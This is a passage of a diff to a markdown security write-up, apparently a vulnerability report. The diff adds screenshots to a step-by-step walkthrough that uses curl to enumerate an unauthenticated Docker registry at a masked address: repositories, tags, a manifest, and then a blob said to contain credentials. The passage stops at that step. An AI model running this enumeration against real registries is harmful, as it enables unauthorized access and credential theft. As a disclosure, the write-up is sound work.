@@ -19,11 +19,19 @@ curl -s http://11.x.x.x:5000/v2/
 # Returns: {} with Docker-Distribution-Api-Version: registry/2.0 header
 ```
 
+<img width="761" height="431" alt="image" src="https://github.com/user-attachments/assets/acdd2df3-860d-49b1-9142-de2028b62de6" />
+
+
+
 ### Step 2 — Enumerate Repositories (unauthenticated)
 ```bash
 curl -s http://11.x.x.x:5000/v2/_catalog
 # {"repositories":["pul/firmware-builder","pul/sonar-runner"]}
 ```
+
+<img width="843" height="224" alt="image" src="https://github.com/user-attachments/assets/0921b911-87cc-4024-8447-0c59dd8f02b6" />
+
+
 
 ### Step 3 — Get Tags
 ```bash
@@ -31,11 +39,19 @@ curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/tags/list
 # {"name":"pul/firmware-builder","tags":["latest","v3.2.1","v3.1.0","v3.0.5"]}
 ```
 
+<img width="1086" height="300" alt="image" src="https://github.com/user-attachments/assets/eefc5ef4-d48b-4d1d-88fc-012375f1607f" />
+
+
+
 ### Step 4 — Get Manifest (extract config digest)
 ```bash
 curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/manifests/latest | python3 -m json.tool
 ```
 Note the config digest: `sha256:a4f3c2b1e8d7...`
+
+<img width="1297" height="548" alt="image" src="https://github.com/user-attachments/assets/5bd18a47-d48a-4060-aefd-29df2cf1e8c0" />
+
+
 
 ### Step 5 — Download Config Blob (contains ENV with credentials)
 ```bash
